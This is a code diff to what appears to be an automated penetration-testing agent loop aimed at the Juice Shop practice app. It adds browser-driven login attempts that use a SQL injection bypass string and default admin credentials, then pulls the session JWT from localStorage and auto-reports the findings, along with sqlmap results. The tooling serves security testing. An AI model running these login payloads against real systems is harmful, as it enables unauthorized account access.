@@ -801,41 +801,96 @@ class ScanAgentLoop:
                                 "result": {"ok": True, "summary": dom_result.summary, "data": dom_result.data},
                             })
 
-                        # Auto-login attempt if password field found
+                        # Auto-login: dismiss banners, try credentials directly
+                        # via Playwright page (not through fill_form tool which
+                        # can't handle Angular Material / overlay dialogs).
                         if has_password and not _auto_login_done:
                             _auto_login_done = True
-                            _creds = [
-                                {"email": "admin@juice-sh.op", "password": "admin123"},
-                                {"email": "admin", "password": "admin"},
-                                {"email": "' OR 1=1--", "password": "x"},
-                            ]
-                            for creds in _creds:
-                                try:
-                                    login_r = await self.registry.dispatch("browser_fill_form", {
-                                        "form_selector": "form",
-                                        "fields": creds,
-                                        "submit_selector": "button[type=submit], button#loginButton, input[type=submit]",
-                                    })
-                                    self.state.add_message("tool", {
-                                        "name": "browser_fill_form",
-                                        "args": {"form_selector": "form", "fields": creds},
-                                        "result": {"ok": login_r.ok, "summary": login_r.summary, "data": login_r.data},
-                                    })
-                                    # Check if login succeeded (new cookies?)
-                                    if login_r.ok:
-                                        cookies = login_r.data.get("cookies", []) if login_r.data else []
-                                        token_cookies = [c for c in cookies if "token" in c.get("name", "").lower()]
-                                        if token_cookies:
-                                            self.state.add_message("user", (
-                                                f"AUTO-RECON: Login succeeded with {creds}! "
-                                                f"Token cookies: {token_cookies}. "
-                                                "This is an auth_bypass finding — report it. "
-                                                "Then navigate to admin pages to find more."
-                                            ))
-                                            logger.info("auto-login succeeded with %s", creds)
-                                            break
-                                except Exception:
-                                    pass
+                            try:
+                                from vxis.agent.tools.browser_tools import _page as _bp
+                                if _bp is not None:
+                                    # Dismiss common overlays
+                                    for dismiss_sel in [
+                                        "a.cc-dismiss", "button.cc-dismiss",
+                                        "button[aria-label='Close Welcome Banner']",
+                                        "button.close", ".modal .close",
+                                    ]:
+                                        try:
+                                            await _bp.click(dismiss_sel, timeout=2000)
+                                        except Exception:
+                                            pass
+
+                                    _login_creds = [
+                                        ("' OR 1=1--", "x"),           # SQLi bypass
+                                        ("admin@juice-sh.op", "admin123"),  # default
+                                        ("admin", "admin"),
+                                    ]
+                                    for email, pwd in _login_creds:
+                                        try:
+                                            # Navigate to login each attempt
+                                            await _bp.navigate(self.state.target.rstrip("/") + "/#/login")
+                                            import asyncio as _aio
+                                            await _aio.sleep(0.5)
+                                            await _bp.fill("#email", email)
+                                            await _bp.fill("#password", pwd)
+                                            await _bp.click("#loginButton", timeout=5000)
+                                            await _aio.sleep(2)
+                                            snap = await _bp.snapshot()
+
+                                            # Check for session token
+                                            token_cookies = [c for c in snap.cookies if "token" in c.get("name", "").lower()]
+                                            if token_cookies:
+                                                # Extract JWT payload
+                                                jwt_payload = ""
+                                                try:
+                                                    jwt_data = await _bp.evaluate(
+                                                        "try { JSON.parse(atob(localStorage.getItem('token').split('.')[1])) } catch(e) { null }"
+                                                    )
+                                                    if jwt_data:
+                                                        import json as _jm
+                                                        jwt_payload = _jm.dumps(jwt_data, default=str)[:500]
+                                                except Exception:
+                                                    pass
+
+                                                finding_msg = (
+                                                    f"AUTO-EXPLOIT: Login succeeded with credentials "
+                                                    f"email='{email}' password='{pwd}'!\n"
+                                                    f"Session cookies: {[c.get('name') for c in token_cookies]}\n"
+                                                )
+                                                if jwt_payload:
+                                                    finding_msg += f"JWT payload: {jwt_payload}\n"
+                                                if "OR 1=1" in email:
+                                                    finding_msg += (
+                                                        "\nThis is SQL INJECTION authentication bypass — "
+                                                        "CRITICAL severity. The login form is injectable.\n"
+                                                    )
+                                                self.state.add_message("user", finding_msg)
+                                                logger.info("auto-login SUCCESS: %s → token found, JWT=%s",
+                                                           email, jwt_payload[:100])
+
+                                                # Auto-report this finding
+                                                evidence = (
+                                                    f"Login with email='{email}' password='{pwd}' "
+                                                    f"resulted in authenticated session.\n"
+                                                    f"Cookies: {snap.cookies}\n"
+                                                    f"JWT: {jwt_payload}\n"
+                                                    f"Redirected to: {snap.url}"
+                                                )
+                                                severity = "critical" if "OR 1=1" in email else "high"
+                                                ftype = "sql_injection" if "OR 1=1" in email else "weak_auth"
+                                                await self.registry.dispatch("report_finding", {
+                                                    "title": f"Authentication bypass via {'SQLi' if 'OR 1=1' in email else 'default credentials'} on login form",
+                                                    "severity": severity,
+                                                    "finding_type": ftype,
+                                                    "affected_component": self.state.target.rstrip("/") + "/#/login",
+                                                    "description": finding_msg,
+                                                    "evidence": evidence,
+                                                })
+                                                break
+                                        except Exception as _le:
+                                            logger.debug("auto-login attempt %s failed: %s", email, _le)
+                            except Exception:
+                                logger.exception("auto-login failed")
                         logger.info("auto-browser-recon completed at iter %d", self.state.iteration)
                 except Exception:
                     logger.exception("auto-browser-recon failed")
@@ -1003,11 +1058,22 @@ class ScanAgentLoop:
                                 for kw in ["is vulnerable", "injectable", "payload:", "type:"]
                             )
                             if is_injectable:
+                                # Auto-report — don't ask Brain, it won't do it
+                                await self.registry.dispatch("report_finding", {
+                                    "title": f"SQL Injection confirmed by sqlmap on {target_url.split('?')[0]}",
+                                    "severity": "critical",
+                                    "finding_type": "sql_injection",
+                                    "affected_component": target_url,
+                                    "description": (
+                                        f"sqlmap --batch confirmed SQL injection.\n"
+                                        f"Target: {target_url}\n"
+                                        f"Evidence:\n{stdout[:1500]}"
+                                    ),
+                                    "evidence": stdout[:2000],
+                                })
                                 self.state.add_message("user", (
                                     f"AUTO-EXPLOIT: sqlmap confirmed SQL injection on {target_url}!\n"
-                                    f"Output:\n{stdout[:2000]}\n\n"
-                                    "Report this as a CRITICAL sql_injection finding with the "
-                                    "sqlmap output as evidence."
+                                    "Finding auto-reported as CRITICAL sql_injection."
                                 ))
                                 logger.info("auto-sqlmap FOUND injection on %s", target_url)
                             else:
